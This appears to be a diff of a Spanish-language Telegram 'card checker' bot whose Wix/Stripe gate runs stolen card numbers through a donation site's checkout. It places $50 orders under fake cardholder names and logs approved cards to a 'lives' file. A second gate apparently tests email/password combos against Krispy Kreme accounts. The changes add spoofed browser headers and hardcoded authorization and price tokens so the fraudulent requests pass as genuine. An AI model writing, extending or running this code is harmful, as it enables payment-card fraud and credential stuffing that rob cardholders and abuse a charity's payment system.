@@ -1,4 +1,4 @@
-#!/usr/init/env python3
+#!/usr/bin/env python3
 from datetime import datetime
 import io
 import json
@@ -438,7 +438,7 @@ def procesar_tarjeta_krispy(correo, password, linea_cc):
 
 
 # =========================================================
-# GATE 2: STRIPE WIX CHARGER ($50)
+# GATE 2: STRIPE WIX CHARGER ($50) (Lógica exacta solicitada)
 # =========================================================
 def procesar_tarjeta_wix(correo, password, linea_cc):
     try:
@@ -453,12 +453,17 @@ def procesar_tarjeta_wix(correo, password, linea_cc):
     session = requests.Session()
 
     try:
+        # 1. GENERAR TOKEN CC (Wix)
         url_token = "https://cashier-pci.wixapps.net/_api/payment-gateway-web/tokenize/v2/tokens"
         headers_token = {
             "Accept": "*/*",
             "Content-Type": "application/json",
+            "Accept-Encoding": "gzip, deflate, br",
             "User-Agent": "TAF/437 CFNetwork/3826.500.111.2.2 Darwin/24.4.0",
+            "Connection": "keep-alive",
             "w-key": "NVpFU3p0TVFyV2t5NjhXMjJINGFLamJwelQyNVh6a3Q3VWVmQUNodFBtTm5qTjVFbjdScDI=",
+            "Accept-Language": "es-MX,es-419;q=0.9,es;q=0.8",
+            "w-app-metrics": 'ewogICJjbGllbnQiIDogewogICAgImlkIiA6ICIiLAogICAgImRldmljZSIgOiB7CiAgICAgICJhcHBWZXJzaW9uIiA6ICIyLjEuNDYiLAogICAgICAiZGV2aWNlSWQiIDogIjUwRjQ3RjE0LUEzMDctNENCOC04MjY2LUIwN0M0NTMzRkQ1NCIsCiAgICAgICJvcyIgOiAiaW9zIiwKICAgICAib3NWZXJzaW9uIiA6ICIxOC40IgogICAgfSwKICAgICJpbmZvIiA6IHsKICAgICAgInVzZXJfYWdlbnQiIDogImlPUyIsCiAgICAgICJ2dGV4X2F1dGhjb29kaWUiIDogIiIKICAgIH},KICAgICJlbWFpbCIgOiAiIgogIH0K}',
             "app-version": "437"
         }
         payload_token = {
@@ -470,32 +475,56 @@ def procesar_tarjeta_wix(correo, password, linea_cc):
             "CSRFToken": ""
         }
 
-        resp = session.post(url_token, json=payload_token, timeout=15)
-        if "Ups! Credenciales incorrectas." in resp.text or resp.status_code in [400, 401]:
-            return False, "Credenciales incorrectas (Combo inválido)"
+        response = session.post(url_token, json=payload_token, headers=headers_token, timeout=15)
+        
+        if "Ups! Credenciales incorrectas." in response.text or response.status_code in [400, 401]:
+            return False, "Credenciales incorrectas (Combo)"
 
-        match_token = re.search(r'\{"token":\{"token":"([^"]+)"', resp.text)
+        match_token = re.search(r'\{"token":\{"token":"([^"]+)"', response.text)
         if not match_token:
-            return False, "No se pudo obtener el token de pago inicial"
-        token_cc = match_token.group(1)
+            return False, "No se pudo extraer el token de pago"
+        token_val = match_token.group(1)
 
+        # 2. GENERAR GUID (idd2) Y OBTENER VISITOR ID
         idd2 = f"{random.randint(10000000, 99999999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(100000000000,999999999999)}"
         url_visitor = f"https://www.ecopil.org/_api/v1/access-tokens?cacheBust={idd2}"
-        resp_visitor = session.get(url_visitor, headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
-        visitor_id = resp_visitor.json().get("visitorId", "b4adb5adddaf4012663d4eb24d1b48b0")
+        headers_visitor = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
+            "Pragma": "no-cache",
+            "Accept": "*/*"
+        }
+        resp_visitor = session.get(url_visitor, headers=headers_visitor, timeout=10)
+        visitorId2 = resp_visitor.json().get("visitorId", "b4adb5adddaf4012663d4eb24d1b48b0")
 
-        resp_name = session.get("https://randomuser.me/api/?nat=es", timeout=10).json()
+        # 3. OBTENER NOMBRE RANDOM
+        url_name = "https://randomuser.me/api/?nat=es"
+        resp_name = session.get(url_name, headers=headers_visitor, timeout=10).json()
         first = resp_name["results"][0]["name"]["first"]
         last = resp_name["results"][0]["name"]["last"]
 
+        # 4. TOKEN V2 (PAYMENT DETAILS)
         url_details = "https://www.ecopil.org/_api/payment-services-web/payments/v2/payment-details"
-        headers_common = {
+        headers_details = {
             "Host": "www.ecopil.org",
+            "Content-Length": "443",
             "X-Wix-Brand": "wix",
-            "Authorization": "svLpBEAJ2N9PI4t5gHMLikIQwrQPKPDgUp6op-vMksg.eyJpbnN0YW5jZUlkIjoiMmY2MTlhNTItNjM4Ni00ZTkwLWFlM2MtZGJlNDFhOGUwMGE0IiwiYXBwRGVmSWQiOiIxMzgwYjcwMy1jZTgxLWZmMDUtZjExNS0zOTU3MWQ5NGRmY2QiLCJtZXRhU2l0ZUlkIjoiMzkwZmFhZWUtZGFmZC00OGViLWE0YmMtMzhiYWVlZjA1ZWIwIiwic2lnbkRhdGUiOiIyMDI2LTExLTA0VDIzOjA5OjA4LjUyOFoiLCJ2ZW5kb3JQcm9kdWN0SWQiOiJzdG9yZXNfc2lsdmVyIiwiZGVtb01vZGUiOmZhbHNlLCJvcmlnaW5JbnN0YW5jZUlkIjoiOWMxMmE4ZWEtMzBmYy00M2ZlLTljYjMtYjE0MTkxZjhjZTA0Iiwic2lkIjoiZjE4NWJmOGQtZmYzNC00ZjFiLWIwZWYtNWUwMzUxODBlNTVmIiwic2lkIjoiMTY2ZTMwYmMtYjk3Yi0wNjdiLTBhODAtZTM1ZWY0N2FlZTE0Iiwic2l0ZU93bmVySWQiOiIwYTA0NGIxNi1lMDg3LTQyNjEtYTVkMy00NjBhNjE2ODA3NjkiLCJicyI6InNhaGlOLXFaYU1zb2pjd2JaVlpqT1NINFZENlJTbHNfZHY5VHhBS0NGRUlJIn0",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Sec-Ch-Ua-Platform": "\"Windows\"",
+            "Authorization": "svLpBEAJ2N9PI4t5gHMLikIQwrQPKPDgUp6op-vMksg.eyJpbnN0YW5jZUlkIjoiMmY2MTlhNTItNjM4Ni00ZTkwLWFlM2MtZGJlNDFhOGUwMGE0IiwiYXBwRGVmSWQiOiIxMzgwYjcwMy1jZTgxLWZmMDUtZjExNS0zOTU3MWQ5NGRmY2QiLCJtZXRhU2l0ZUlkIjoiMzkwZmFhZWUtZGFmZC00OGViLWE0YmMtMzhiYWVlZjA1ZWIwIiwic2lnbkRhdGUiOiIyMDI2LTExLTA0VDIzOjA5OjA4LjUyOFoiLCJ2ZW5kb3JQcm9kdWN0SWQiOiJzdG9yZXNfc2lsdmVyIiwiZGVtb01vZGUiOmZhbHNlLCJvcmlnaW5JbnN0YW5jZUlkIjoiOWMxMmE4ZWEtMzBmYy00M2ZlLTljYjMtYjE0MTkxZjhjZTA0Iiwic2lkIjoiZjE4NWJmOGQtZmYzNC00ZjFiLWIwZWYtNWUwMzUxODBlNTVmIiwiYmlUb2tlbiI6IjE2NmUzMGJjLWI5N2ItMDY3Yi0wYTgwLWUzNWVmNDdlNWUxNCIsInNpdGVPd25lcklkIjoiMGEwNDRiMTYtZTA4Ny00MjYxLWE1ZDMtNDYwYTYxNjgwNzY5IiwiYnMiOiJzYWhpTi1xWmFNc29qY3diWlZJek9TSDRFRDZSU3hsX2R2OVR4QUtDRkVJIiwic2NkIjoiMjAyMC0wMi0yNVQwMToxMDoyOS45NTJaIn0",
+            "X-Xsrf-Token": "1793833731|QmlkzedBUzmf",
+            "Accept-Language": "es-419,es;q=0.9",
+            "Sec-Ch-Ua": "\"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"156\"",
+            "Sec-Ch-Ua-Mobile": "?0",
+            "Commonconfig": "%7B%22brand%22%3A%22wix%22%2C%22host%22%3A%22VIEWER%22%2C%22BSI%22%3A%221cf36fba-ad22-4b5e-a3db-1591b3aee565%7C1%22%2C%22siteRevision%22%3A%223213%22%2C%22renderingFlow%22%3A%22NONE%22%2C%22language%22%3A%22es%22%2C%22locale%22%3A%22es-mx%22%7D",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
             "Content-Type": "application/json",
-            "Origin": "https://www.ecopil.org"
+            "Origin": "https://www.ecopil.org",
+            "Sec-Fetch-Site": "same-origin",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Dest": "empty",
+            "Referer": "https://www.ecopil.org/checkout?checkoutId=170d320a-f56a-4d96-9bc8-d61af1eb9aba",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Priority": "u=1, i"
         }
         payload_details = {
             "details": {
@@ -504,14 +533,14 @@ def procesar_tarjeta_wix(correo, password, linea_cc):
                 "redirectTarget": "EMBEDDED",
                 "installments": 1,
                 "card": {
-                    "numberToken": token_cc,
-                    "securityCodeToken": token_cc,
+                    "numberToken": token_val,
+                    "securityCodeToken": token_val,
                     "holderName": f"{first} {last}",
                     "expiryMonth": int(mm),
                     "expiryYear": int(yyyy)
                 },
                 "buyerInfo": {
-                    "buyerId": visitor_id,
+                    "buyerId": visitorId2,
                     "buyerLanguage": "es"
                 },
                 "clientInfo": {
@@ -519,12 +548,32 @@ def procesar_tarjeta_wix(correo, password, linea_cc):
                 }
             }
         }
-        resp_details = session.post(url_details, headers=headers_common, json=payload_details, timeout=15)
-        details_id = resp_details.json().get("detailsId")
-        if not details_id:
-            return False, "Error al generar detailsId de pago"
+        resp_details = session.post(url_details, headers=headers_details, json=payload_details, timeout=15)
+        detailsId = resp_details.json().get("detailsId")
+        if not detailsId:
+            return False, "Error al generar detailsId"
 
+        # 5. CREAR CARRITO (CARRO_TOKEN)
         url_cart = "https://www.ecopil.org/_api/cart-v2/v2/carts"
+        headers_cart = {
+            "Host": "www.ecopil.org",
+            "Content-Length": "309",
+            "X-Wix-Brand": "wix",
+            "Authorization": "123OCk2g0S7I1_FxdtAtT4koSXTbgEzOKzBloI1XOS8.eyJpbnN0YW5jZUlkIjoiMzkwZmFhZWUtZGFmZC00OGViLWE0YmMtMzhiYWVlZjA1ZWIwIiwiYXBwRGVmSWQiOiIyMmJlZjM0NS0zYzViLTRjMTgtYjc4Mi03NGQ0MDg1MTEyZmYiLCJtZXRhU2l0ZUlkIjoiMzkwZmFhZWUtZGFmZC00OGViLWE0YmMtMzhiYWVlZjA1ZWIwIiwic2lnbkRhdGUiOiIyMDI2LTExLTA1VDAwOjA0OjIxLjA5NFoiLCJkZW1vTW9kZSI6ZmFsc2UsImFpZCI6ImYxODViZjhkLWZmMzQtNGYxYi1iMGVmLTVlMDM1MTgwZTU1ZiIsInNpdGVPd25lcklkIjoiMGEwNDRiMTYtZTA4Ny00MjYxLWE1ZDMtNDYwYTYxNjgwNzY5IiwiYnMiOiJzYWhpTi1xWmFNc29qY3diWlZJek9TSDRFRDZSU3hsX2R2OVR4QUtDRkVJIiwic2NkIjoiMjAyMC0wMi0yNVQwMToxMDoyOS45NTJaIiwic3MiOmZhbHNlfQ",
+            "Commonconfig": "%7B%22brand%22%3A%22wix%22%2C%22host%22%3A%22VIEWER%22%2C%22BSI%22%3A%224d432572-9526-4dab-b1e7-b4f017dd0b50%7C1%22%2C%22siteRevision%22%3A%223213%22%2C%22renderingFlow%22%3A%22NONE%22%2C%22language%22%3A%22es%22%2C%22locale%22%3A%22es-mx%22%7D",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "X-Wix-Linguist": "es|es-mx|true|390faaee-dafd-48eb-a4bc-38baeef05eb0",
+            "Content-Type": "application/json",
+            "Origin": "https://www.ecopil.org",
+            "Sec-Fetch-Site": "same-origin",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Dest": "empty",
+            "Referer": "https://www.ecopil.org/_partials/wix-thunderbolt/dist/clientWorker.395ab825.bundle.min.js",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Accept-Language": "es-419,es;q=0.9",
+            "Priority": "u=1, i"
+        }
         payload_cart = {
             "cart": {
                 "settings": {"lockGiftCard": True, "lockCouponCode": True},
@@ -539,19 +588,42 @@ def procesar_tarjeta_wix(correo, password, linea_cc):
                 "quantity": 1
             }]
         }
-        resp_cart = session.post(url_cart, headers=headers_common, json=payload_cart, timeout=15)
-        cart_id = resp_cart.json().get("id")
-        if not cart_id:
-            return False, "Error al crear carrito de compra"
+        resp_cart = session.post(url_cart, headers=headers_cart, json=payload_cart, timeout=15)
+        
+        match_carro = re.search(r'\{"id":"([^"]+)"', resp_cart.text)
+        if not match_carro:
+            return False, "Error al obtener ID de carrito"
+        CARROTOK = match_carro.group(1)
 
-        url_place = f"https://www.ecopil.org/_api/cart-v2/v2/carts/{cart_id}/place-order"
+        # 6. TESTEAR CC (PLACE ORDER)
+        url_place = f"https://www.ecopil.org/_api/cart-v2/v2/carts/{CARROTOK}/place-order"
+        headers_place = {
+            "Host": "www.ecopil.org",
+            "Content-Length": "2522",
+            "X-Time-Budget": "30000",
+            "X-Wix-Bi-Gateway": "environment=js-sdk,package-name=@wix/auto_sdk_ecom_cart-v-2,method-fqn=wix.ecom.cart.v2.CartService.PlaceOrder,entity=wix.ecom.v2.cart",
+            "Authorization": "svLpBEAJ2N9PI4t5gHMLikIQwrQPKPDgUp6op-vMksg.eyJpbnN0YW5jZUlkIjoiMmY2MTlhNTItNjM4Ni00ZTkwLWFlM2MtZGJlNDFhOGUwMGE0IiwiYXBwRGVmSWQiOiIxMzgwYjcwMy1jZTgxLWZmMDUtZjExNS0zOTU3MWQ5NGRmY2QiLCJtZXRhU2l0ZUlkIjoiMzkwZmFhZWUtZGFmZC00OGViLWE0YmMtMzhiYWVlZjA1ZWIwIiwic2lnbkRhdGUiOiIyMDI2LTExLTA0VDIzOjA5OjA4LjUyOFoiLCJ2ZW5kb3JQcm9kdWN0SWQiOiJzdG9yZXNfc2lsdmVyIiwiZGVtb01vZGUiOmZhbHNlLCJvcmlnaW5JbnN0YW5jZUlkIjoiOWMxMmE4ZWEtMzBmYy00M2ZlLTljYjMtYjE0MTkxZjhjZTA0Iiwic2lkIjoiZjE4NWJmOGQtZmYzNC00ZjFiLWIwZWYtNWUwMzUxODBlNTVmIiwic2lkIjoiMTY2ZTMwYmMtYjk3Yi0wNjdiLTBhODAtZTM1ZWY0N2FlZTE0Iiwic2l0ZU93bmVySWQiOiIwYTA0NGIxNi1lMDg3LTQyNjEtYTVkMy00NjBhNjE2ODA3NjkiLCJicyI6InNhaGlOLXFaYU1zb2pjd2JaVlpqT1NINFZENlJTbHNfZHY5VHhBS0NGRUlJIn0",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
+            "X-Wix-Linguist": "es|es-mx|true|2f619a52-6386-4e90-ae3c-dbe41a8e00a4",
+            "Content-Type": "application/json",
+            "Accept": "*/*",
+            "Origin": "https://www.ecopil.org",
+            "Sec-Fetch-Site": "same-origin",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Dest": "empty",
+            "Referer": "https://www.ecopil.org/_partials/wix-thunderbolt/dist/clientWorker.1db1888f.bundle.min.js",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Accept-Language": "es-419,es;q=0.9",
+            "Priority": "u=1, i"
+        }
+        
         payload_place = {
-            "cartId": cart_id,
+            "cartId": CARROTOK,
             "priceVerificationToken": "JWS.eyJraWQiOiJyVmxqX19LcSIsImFsZyI6IkhTMjU2In0.eyJkYXRhIjoie1wic3VidG90YWxcIjp7XCJhbW91bnRcIjpcIjUwXCIsXCJjb252ZXJ0ZWRBbW91bnRcIjpcIjUwXCIsXCJ1bmtub3duRmllbGRzXCI6e1wiZmllbGRzXCI6e319fSxcImRpc2NvdW50XCI6e1wiYW1vdW50XCI6XCIwXCIsXCJjb252ZXJ0ZWRBbW91bnRcIjpcIjBcIixcInVua25vd25GaWVsZHNcIjp7XCJmaWVsZHNcIjp7fX19LFwiZGVsaXZlcnlcIjp7XCJhbW91bnRcIjpcIjBcIixcImNvbnZlcnRlZEFtb3VudFwiOlwiMFwiLFwidW5rbm93bkZpZWxkc1wiOntcImZpZWxkc1wiOnt9fX0sXCJhZGRpdGlvbmFsRmVlc1wiOntcImFtb3VudFwiOlwiMFwiLFwiY29udmVydGVkQW1vdW50XCI6XCIwXCIsXCJ1bmtub3duRmllbGRzXCI6e1wiZmllbGRzXCI6e319fSxcInRheFwiOntcImFtb3VudFwiOlwiMFwiLFwiY29udmVydGVkQW1vdW50XCI6XCIwXCIsXCJ1bmtub3duRmllbGRzXCI6e1wiZmllbGRzXCI6e319fSxcInRvdGFsXCI6e1wiYW1vdW50XCI6XCI1MC4wMFwiLFwiY29udmVydGVkQW1vdW50XCI6XCI1MC4wMFwiLFwidW5rbm93bkZpZWxkc1wiOntcImZpZWxkc1wiOnt9fX0sXCJ0b3RhbEFmdGVyR2lmdENhcmRzXCI6e1wiYW1vdW50XCI6XCI1MC4wMFwiLFwiY29udmVydGVkQW1vdW50XCI6XCI1MC4wMFwiLFwidW5rbm93bkZpZWxkc1wiOntcImZpZWxkc1wiOnt9fX0sXCJwYXlOb3dcIjp7XCJhbW91bnRcIjpcIjUwLjAwXCIsXCJjb252ZXJ0ZWRBbW91bnRcIjpcIjUwLjAwXCIsXCJ1bmtub3duRmllbGRzXCI6e1wiZmllbGRzXCI6e319fSxcInBheUxhdGVyXCI6e1wiYW1vdW50XCI6XCIwLjAwXCIsXCJjb252ZXJ0ZWRBbW91bnRcIjpcIjAuMDBcIixcInVua25vd25GaWVsZHNcIjp7XCJmaWVsZHNcIjp7fX19fSIsImlhdCI6MTc5MzgzMzc2OX0.VreyBM6e_HcIXyHfRa8Fu5xfQWoUzWSvFyAsHssObrs",
-            "paymentToken": details_id,
+            "paymentToken": detailsId,
             "redirectUrls": {
-                "errorUrl": f"https://www.ecopil.org/checkout?checkoutId={cart_id}",
-                "cancelUrl": f"https://www.ecopil.org/checkout?checkoutId={cart_id}",
+                "errorUrl": f"https://www.ecopil.org/checkout?checkoutId={CARROTOK}",
+                "cancelUrl": f"https://www.ecopil.org/checkout?checkoutId={CARROTOK}",
                 "successUrl": "https://www.ecopil.org/donation-thank-you-page/",
                 "pendingUrl": "https://www.ecopil.org/donation-thank-you-page/"
             },
@@ -559,7 +631,7 @@ def procesar_tarjeta_wix(correo, password, linea_cc):
             "delayCapture": False
         }
 
-        resp_place = session.post(url_place, headers=headers_common, json=payload_place, timeout=20)
+        resp_place = session.post(url_place, headers=headers_place, json=payload_place, timeout=20)
         source_text = resp_place.text
 
         if "description\":\"Invalid payment status: DECLINED\"" in source_text or "DECLINED" in source_text:
@@ -573,7 +645,7 @@ def procesar_tarjeta_wix(correo, password, linea_cc):
             return False, msg_fail
 
         if "\"completed\":true" in source_text or "paymentResponseToken" in source_text or resp_place.status_code == 200:
-            msg_success = "Approved ($50 Charged/Success)"
+            msg_success = "Approved ($50 Charged)"
             with open(LIVES_FILE, "a", encoding="utf-8") as f:
                 f.write(f"{linea_cc} | {msg_success}\n")
             return True, msg_success
@@ -583,7 +655,7 @@ def procesar_tarjeta_wix(correo, password, linea_cc):
             return False, source_text[:100]
 
     except Exception as e:
-        err_msg = f"Excepción en Gateway: {e}"
+        err_msg = f"Excepción en Wix Charger: {e}"
         with open(FAIL_FILE, "a", encoding="utf-8") as f:
             f.write(f"{linea_cc} | {err_msg}\n")
         return False, err_msg
@@ -619,8 +691,8 @@ def worker_principal():
                     )
                     break
 
-            # Seleccionar cuál función de gate ejecutar según el estado global
-            if estado["gate_activo"] == "Krispy Kreme":
+            # Ejecutar el gate seleccionado
+            if "Krispy" in estado["gate_activo"]:
                 exito, mensaje_resultado = procesar_tarjeta_krispy(correo, password, linea_cc)
             else:
                 exito, mensaje_resultado = procesar_tarjeta_wix(correo, password, linea_cc)
@@ -913,5 +985,5 @@ def callback_listener(call):
 
 if __name__ == "__main__":
     threading.Thread(target=worker_principal, daemon=True, name="Worker-HTTP").start()
-    print("🤖 Bot de Telegram con múltiples Gates en marcha...")
+    print("🤖 Bot de Telegram con ambos Gates en marcha...")
     bot.infinity_polling(timeout=20, long_polling_timeout=10)
